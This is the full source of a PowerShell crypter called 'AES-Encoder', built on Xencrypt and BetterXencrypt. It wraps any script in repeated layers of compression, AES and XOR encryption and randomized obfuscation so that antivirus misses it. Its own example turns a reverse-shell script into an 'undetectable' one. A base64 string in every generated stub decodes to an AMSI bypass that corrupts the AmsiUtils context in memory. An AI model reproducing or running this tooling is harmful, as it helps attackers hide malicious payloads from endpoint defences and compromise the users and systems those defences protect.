# Xentropy's Copyright
#    Xencrypt - PowerShell crypter
#    Copyright (C) 2020 Xentropy ( @SamuelAnttila )
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
# GetRektBoy724's Copyright
#    BetterXencrypt - PowerShell crypter
#    Copyright (C) 2021 GetRektBoy724
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
Set-StrictMode -Version Latest
$console = $host.UI.RawUI
$console.WindowTitle = "Powershell Crypter"
$ErrorActionPreference = "Stop"
$PSDefaultParameterValues['*:ErrorAction']='Stop'

function Create-Var() {
        $set = "abcdefghijkmnopqrstuvwxyz1234567890"
        (1..(10 + (Get-Random -Maximum 7)) | %{ $set[(Get-Random -Minimum 5 -Maximum $set.Length)] } ) -join ''
}

function xorEnc {
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $string = $(Throw("oopsie doopsie we made a fucky wucky shit")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $method = $(Throw("oopsie doopsie we made a fucky wucky shit")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $key = $(Throw("oopsie doopsie we made a fucky wucky shit"))
    )
    $xorkey = [System.Text.Encoding]::UTF8.GetBytes($key)

    if ($method -eq "decrypt"){
        $string = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($string))
    }

    $byteString = [System.Text.Encoding]::UTF8.GetBytes($string)
    $xordData = $(for ($i = 0; $i -lt $byteString.length; ) {
        for ($j = 0; $j -lt $xorkey.length; $j++) {
            $byteString[$i] -bxor $xorkey[$j]
            $i++
            if ($i -ge $byteString.Length) {
                $j = $xorkey.length
            }
        }
    })

    if ($method -eq "encrypt") {
        $xordData = [System.Convert]::ToBase64String($xordData)
    } else {
        $xordData = [System.Text.Encoding]::UTF8.GetString($xordData)
    }
    
    return $xordData
}

function Invoke-AES-Encoder {
     <#
    .SYNOPSIS

    Invoke-AES-Encoder takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
	It also lets you layer this recursively however many times you want in order to foil dynamic & heuristic detection.

    .DESCRIPTION

     Invoke-AES-Encoder takes any PowerShell script as an input and both packs and encrypts it to evade AV. 
     The output script is highly randomized in order to make static analysis even more difficut.
     It also lets you layer this recursively however many times you want in order to attempt to foil dynamic & heuristic detection.


    .PARAMETER InFile
    Specifies the script to obfuscate/encrypt.

    .PARAMETER OutFile
    Specifies the output script.

    .PARAMETER Iterations
    The number of times the PowerShell script will be packed & crypted recursively. Default is 4.

    .EXAMPLE

    PS> Invoke-AES-Encoder -InFile reverse-shell.ps1 -OutFile undetectable.ps1 -Iterations 12

    .LINK

    https://github.com/chainski/AES-Encoder

    #>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $infile = $(Throw("-InFile is required")),
        [Parameter(Mandatory,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $outfile = $(Throw("-OutFile is required")),
        [Parameter(Mandatory=$false,ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [string] $iterations = 4
    )
    Process {
     
      Write-Host `r`n
      Write-Host -ForegroundColor Red   "  ░░░░░  ░░░░░░░ ░░░░░░░     ░░░░░░░ ░░░    ░░  ░░░░░░  ░░░░░░  ░░░░░░  ░░░░░░░ ░░░░░░  "
      Write-Host -ForegroundColor White " ▒▒   ▒▒ ▒▒      ▒▒          ▒▒      ▒▒▒▒   ▒▒ ▒▒      ▒▒    ▒▒ ▒▒   ▒▒ ▒▒      ▒▒   ▒▒ "
      Write-Host -ForegroundColor Red   " ▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒▒     ▒▒▒▒▒   ▒▒ ▒▒  ▒▒ ▒▒      ▒▒    ▒▒ ▒▒   ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  "
      Write-Host -ForegroundColor White " ▓▓   ▓▓ ▓▓           ▓▓     ▓▓      ▓▓  ▓▓ ▓▓ ▓▓      ▓▓    ▓▓ ▓▓   ▓▓ ▓▓      ▓▓   ▓▓ "
      Write-Host -ForegroundColor Red   " ██   ██ ███████ ███████     ███████ ██   ████  ██████  ██████  ██████  ███████ ██   ██ "
      Write-Host -ForegroundColor Blue   "                         ╔═════════════════════════════════════════╗                   "                         
      Write-Host -ForegroundColor White  "                         ║          AES Encoder 1.0.0.1            ║                   "
      Write-Host -ForegroundColor Blue   "                         ║           coded by Chainski             ║                   "
      Write-Host -ForegroundColor White  "                         ║      For Educational Purposes Only      ║                   "
      Write-Host -ForegroundColor Red    "                         ║                 Github                  ║                   "
      Write-Host -ForegroundColor White  "                         ║ https://github.com/chainski/AES-Encoder ║                   "  
      Write-Host -ForegroundColor Blue   "                         ╚═════════════════════════════════════════╝                   "  
	  
      Write-Host `r`n
        sleep 1
        # read
        Write-Host "[*] Reading '$($infile)' ..." 
        $codebytes = [System.IO.File]::ReadAllBytes($infile)


        for ($i = 1; $i -le $iterations; $i++) {
            # Decide on encryption params ahead of time 
            
            Write-Host "[*] Starting code layer  ..." -ForegroundColor Yellow 
            $paddingmodes = 'PKCS7','ISO10126','ANSIX923','Zeros'
            $paddingmode = $paddingmodes | Get-Random
            $ciphermodes = 'ECB','CBC'
            $ciphermode = $ciphermodes | Get-Random

            $keysizes = 128,192,256
            $keysize = $keysizes | Get-Random

            $compressiontypes = 'Gzip','Deflate'
            $compressiontype = $compressiontypes | Get-Random

            # compress
            Write-Host "[*] Compressing ..."
            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
            if ($compressiontype -eq "Gzip") {
                $compressionStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
            } elseif ( $compressiontype -eq "Deflate") {
                $compressionStream = New-Object System.IO.Compression.DeflateStream $output, ([IO.Compression.CompressionMode]::Compress)
            }
            $compressionStream.Write( $codebytes, 0, $codebytes.Length )
            $compressionStream.Close()
            $output.Close()
            $compressedBytes = $output.ToArray()

            # generate key
            Write-Host "[*] Generating encryption key ..."
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
            if ($ciphermode -eq 'CBC') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
            } elseif ($ciphermode -eq 'ECB') {
                $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB
            }

            if ($paddingmode -eq 'PKCS7') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            } elseif ($paddingmode -eq 'ISO10126') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
            } elseif ($paddingmode -eq 'ANSIX923') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::ANSIX923
            } elseif ($paddingmode -eq 'Zeros') {
                $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
            }

            $aesManaged.BlockSize = 128
            $aesManaged.KeySize = 256
            $aesManaged.GenerateKey()
            $b64key = [System.Convert]::ToBase64String($aesManaged.Key)

            # encrypt
            Write-Host "[*] Encrypting with AES..."
            $encryptor = $aesManaged.CreateEncryptor()
            $encryptedData = $encryptor.TransformFinalBlock($compressedBytes, 0, $compressedBytes.Length);
            [byte[]] $fullData = $aesManaged.IV + $encryptedData
            $aesManaged.Dispose()
            $b64encrypted = [System.Convert]::ToBase64String($fullData)

            #reverse base64 encrypted for obfuscation
            $reversingb64encrypted = $b64encrypted.ToCharArray()
            [array]::Reverse($reversingb64encrypted)
            $b64encryptedreversed = -join($reversingb64encrypted)
        
            # xor encrypt
            Write-Host "[*] Encrypting with XOR ..."
            # this is a literal fucking hell,i need to fucking set variable names for the goddang xor encryptor/decryptor at the stub
            $string = Create-Var
            $method = Create-Var
            $key = Create-Var
            $byteString = Create-Var
            $xordData = Create-Var
            $xori = Create-Var
            $xorj = Create-Var
            # now its the time to XOR encrypt the reversed AES encrypted payload
            $XOREncKey = Create-Var
            $base64XOREncPayload = xorEnc -string "$b64encryptedreversed" -method "encrypt" -key "$XOREncKey"

            # write
            Write-Host "[*] Finalizing code layer ..."

            $stub_template = ''
            $code_alternatives  = @()
			$code_alternatives += '([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("Zm9yZWFjaCgkaSBpbiBbUmVmXS5Bc3NlbWJseS5HZXRUeXBlcygpKXtpZigkaS5OYW1lIC1saWtlICIqc2lVIisiKiIrImlscyIpeyR1dGlsRnVuY3Rpb25zPSRpLkdldEZpZWxkcygnTm9uUHVibGljLFN0YXRpYycpfX07CiRtb3JlY29kZT0iYXNkYWdnd3J3YWdyd3dlZmVhZ3dnIgpmb3JlYWNoKCRmdW5jIGluICR1dGlsRnVuY3Rpb25zKXtpZigkZnVuYy5OYW1lIC1saWtlICIqQ29udGV4dCIpeyRhZGRyPSRmdW5jLkdldFZhbHVlKCRudWxsKX19OwokZGVhZGMwZGU9NDUxMjM0MTIzNTEyMzE1MjM1NjMyMzQ1CltJbnRwdHJdJHBvaW50ZXI9JGFkZHI7CiRkZWFkYjMzZj0ic3RyaW5nMTIzNDIzNDUzMTIzNSIKW0ludDMyW11dJG51bGxCeXRlPUAoMCk7CltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJG51bGxCeXRlLDAsJHBvaW50ZXIsMSk7")))|iex' + "`r`n"
            $code_alternatives += '${43} = [text.encoDiNg]::"uT`F`8".GetBYtES("{42}")' + "`r`n"
            $code_alternatives += '${44} = [tEXt.enCODINg]::"uT`F`8".gEtSTrinG([ConverT]::fRoMBasE64strIng("{0}"))' + "`r`n"
            $code_alternatives += '${45} = [TeXT.EnCodiNg]::"uT`F`8".GETBYTES(${44})' + "`r`n"
            # start XOR decrypt sequence
            $code_alternatives += '${46} = $(for (${47} = 0; ${47} -lt ${45}.lengTH; ) {17}' + "`r`n"
            $code_alternatives += '    for (${48} = 0; ${48} -lt ${43}.LengTh; ${48}++) {17}' + "`r`n"
            $code_alternatives += '        ${45}[${47}] -bxor ${43}[${48}]' + "`r`n"
            $code_alternatives += '        ${47}++' + "`r`n"
            $code_alternatives += '        if (${47} -ge ${45}.lENGTh) {17}' + "`r`n"
            $code_alternatives += '            ${48} = ${43}.lENgth' + "`r`n"
            $code_alternatives += '        {18}' + "`r`n"
            $code_alternatives += '    {18}' + "`r`n"
            $code_alternatives += '{18})' + "`r`n"
            $code_alternatives += '${46} = [texT.enCoDiNg]::"uT`F8".GEtsTring(${46})' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${11} = "${46}"' + "`r`n"
            $code_alternatives += '${9} = ${11}.ToCharArray()' + "`r`n"
            $code_alternatives += '[ArRay]::ReVErse(${9})' + "`r`n"
            $code_alternatives += '${10} = -JOIn(${9})' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${2} = [CONvERt]::FrOMbASe64sTrinG("${10}")' + "`r`n"
            $code_alternatives += '${3} = [CoNVERT]::FrOmbase64stRInG("{1}")' + "`r`n"
            #aes managed but its base64 encoded and reversed ;)
            $code_alternatives += '${24} = "==gCkV2Zh5WYNNXZB5SeoBXYyd2b0BXeyNkL5RXayV3YlNlLtVGdzl3U"'  + "`r`n"
            $code_alternatives += '${25} = ${24}.ToCharArray()'  + "`r`n"
            $code_alternatives += '[ARRAy]::ReVerSE(${25})'  + "`r`n"
            $code_alternatives += '${26} = -join(${25})'  + "`r`n"
            $code_alternatives += '${12} = [teXt.ENcOdiNG]::"uT`F8".gEtsTRINg([CONVeRT]::FRomBasE64stRiNg(${26}))' + "`r`n"
            $code_alternatives += '${4} = New-Object "${12}"' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            #ciphermode but its base64 encoded and reversed 
            if ($ciphermode -eq "ECB") {
                $code_alternatives += '${21} = "==gQDVkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${23} = ${21}.ToCharArray()'  + "`r`n"
                $code_alternatives += '[ARRAY]::revERsE(${23})' + "`r`n"
                $code_alternatives += '${22} = -join(${23})' + "`r`n"
                $code_alternatives += '${13} = [texT.encODInG]::"uT`F8".gETstrINg([ConveRT]::fRoMBase64strINg(${22}))' + "`r`n"
                $code_alternatives += '${14} = & ([scriptblock]::Create(${13}))' + "`r`n"
                $code_alternatives += '${4}.MoDe = ${14}' + "`r`n"
            }elseif ($ciphermode -eq "CBC") {
                $code_alternatives += '${21} = "==wQCNkO60VZk9WTyVGawl2QukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${23} = ${21}.ToCharArray()'  + "`r`n"
                $code_alternatives += '[array]::Reverse(${23})' + "`r`n"
                $code_alternatives += '${22} = -join(${23})' + "`r`n"
                $code_alternatives += '${13} = [TExT.EnCodIng]::"uT`F8".GETStRiNG([CoNVERt]::frombAsE64strING(${22}))' + "`r`n"
                $code_alternatives += '${14} = &([scriptblock]::Create(${13}))' + "`r`n"
                $code_alternatives += '${4}.Mode = ${14}' + "`r`n"
            }
            #paddingmode but its base64 encoded and reversed 
            if ($paddingmode -eq 'PKCS7') {
                $code_alternatives += '${27} = "==wNTN0SQpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
                $code_alternatives += '[arRAy]::reVeRSe(${28})' + "`r`n"
                $code_alternatives += '${29} = -join(${28})' + "`r`n"
                $code_alternatives += '${15} = [texT.enCOdinG]::"uT`F8".getStRiNG([coNveRT]::FrOMBaSe64stRiNG(${29}))' + "`r`n"
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            } elseif ($paddingmode -eq 'ISO10126') {
                $code_alternatives += '${27} = "==gNyEDMx80UJpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
                $code_alternatives += '${29} = -jOin(${28})' + "`r`n"
                $code_alternatives += '${15} = [TExt.encoDING]::"uT`F8".geTsTrInG([coNVErt]::FRoMbAsE64STrinG(${29}))' + "`r`n"                
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            } elseif ($paddingmode -eq 'ANSIX923') {
                $code_alternatives += '${27} = "==wMykDWJNlTBpjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
                $code_alternatives += '[array]::reveRSE(${28})' + "`r`n"
                $code_alternatives += '${29} = -join(${28})' + "`r`n"
                $code_alternatives += '${15} = [tExT.eNcodINg]::"uT`F8".gETSTRinG([cOnVERT]::FROmbASe64striNG(${29}))' + "`r`n"    
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            } elseif ($paddingmode -eq 'Zeros') {
                $code_alternatives += '${27} = "==wcvJXZapjOdVGZv10ZulGZkFGUukHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5N1W"' + "`r`n"
                $code_alternatives += '${28} = ${27}.ToCharArray()' + "`r`n"
                $code_alternatives += '[array]::Reverse(${28})' + "`r`n"
                $code_alternatives += '${29} = -join(${28})' + "`r`n"
                $code_alternatives += '${15} = [tEXT.ENCoDiNg]::"uT`F8".GETStriNG([coNVErT]::frOmBasE64sTRINg(${29}))' + "`r`n"
                $code_alternatives += '${16} = & ([scriptblock]::Create(${15}))' + "`r`n"
                $code_alternatives += '${4}.Padding = ${16}' + "`r`n"
            }
            $code_alternatives += '${4}.bLOcksIzE = ((10+50-20*2)+(4)-20/20+105)' + "`r`n"
            $code_alternatives += '${4}.kEYsizE = '+$keysize + "`n" + '${4}.Key = ${3}' + "`r`n"
            $code_alternatives += '${4}.IV = ${2}[0..(4+5+(20-5-5-2-1-1))]' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $code_alternatives  = @()
            $code_alternatives += '${34} = [teXT.EncOdINg]::UTf8.GetsTRiNg([CONVerT]::FrOMBASe64StRING("U3lzdGVtLklPLk1lbW9yeVN0cmVhbQ=="))' + "`r`n"
            $code_alternatives += '${6} = New-ObJecT ${34}(,${4}.cReatEDeCRYpToR().TranSFOrmfiNALBloCk(${2},16-5+5-5+1+1+1+2,${2}.Length-16+16-16))' + "`r`n"
            $code_alternatives += '${7} = New-Object ${34}' + "`r`n"
            $stub_template += $code_alternatives -join ''


            if ($compressiontype -eq "Gzip") {
                $stub_template += '${40} = [NEt.WeButiliTy]::hTmLdEcOdE("&#x44;&#x65;&#x63;&#x6f;&#x6d;&#x70;&#x72;&#x65;&#x73;&#x73;")' + "`r`n"
                $stub_template += '${41} = & ([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))' + "`r`n"
                $stub_template += '${35} = [tExT.ENcodInG]::UTf8.GeTstrINg([coNvERT]::FRoMBAsE64StRING("U3lzdGVtLklPLkNvbXByZXNzaW9uLkd6aXBTdHJlYW0="))'    + "`r`n"
                $stub_template += '${5} = New-Object ${35} ${6}, (${41}::${40})'    + "`r`n"
            } elseif ( $compressiontype -eq "Deflate") {
                $stub_template += '${40} = [NEt.WeButiliTy]::hTmLdEcOdE("&#x44;&#x65;&#x63;&#x6f;&#x6d;&#x70;&#x72;&#x65;&#x73;&#x73;")' + "`r`n"
                $stub_template += '${41} = & ([scriPtblOck]::cReaTe([TeXt.enCoDInG]::utF8.getsTring([CONveRt]::fromBase64sTRiNg("W0lPLkNvbXByZXNzaW9uLkNvbXByZXNzaW9uTW9kZV0="))))' + "`r`n"
                $stub_template += '${35} = [tEXt.encodINg]::Utf8.GETstRing([convERT]::fROMBase64stRIng("U3lzdGVtLklPLkNvbXByZXNzaW9uLkRlZmxhdGVTdHJlYW0="))'    + "`r`n"
                $stub_template += '${5} = New-OBjEct ${35} ${6}, (${41}::${40})'    + "`r`n"
            }
            $stub_template += '${5}.CopyTo(${7})' + "`r`n"

            $code_alternatives  = @()
            $code_alternatives += '${5}.Close()' + "`r`n"
            $code_alternatives += '${4}.Dispose()' + "`r`n"
            $code_alternatives += '${6}.Close()' + "`r`n"
            $code_alternatives += '${36} = & ([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W1N5c3RlbS5UZXh0LkVuY29kaW5nXQ=="))))' + "`r`n"
            $code_alternatives += '${37} = ([rEgEX]::uNescape("\u0055\u0054\u0046\u0038"))' + "`r`n"
            $code_alternatives += '${38} = ([TeXT.ENCOdinG]::uNiCoDE.gEtSTrInG([cOnveRT]::FROmBAse64stRInG("VABvAEEAcgByAGEAeQA=")))' + "`r`n"
            $code_alternatives += '${39} = ([TeXT.ENCOdinG]::unICodE.gEtSTRIng([cOnvert]::FromBAse64stRing("RwBlAHQAUwB0AHIAaQBuAGcA")))' + "`r`n"
            $code_alternatives += '${8} = ${36}::${37}.${39}(${7}.${38}())' + "`r`n"
            $stub_template += $code_alternatives -join ''

            $stub_template += ('i`Ex','I`e`X','i"e"x','&(gcm i*x)' | Get-Random)+'(${8})' + "`r`n"
            
        
            # it's ugly, but it beats concatenating each value manually.
            [string]$code = $stub_template -f $base64XOREncPayload, $b64key, (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), ("{"), ("}"), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), (Create-Var), $XOREncKey, $key, $string, $byteString, $xordData, $xori, $xorj
            $codebytes = [text.ENcodInG]::uTF8.gEtBYtES($code)
        }
        Write-Host "[*] Writing '$($outfile)' ..."
        [System.IO.File]::WriteAllText($outfile,$code)
        Write-Host "[+] Done!" -foregroundcolor "green"
    }
}
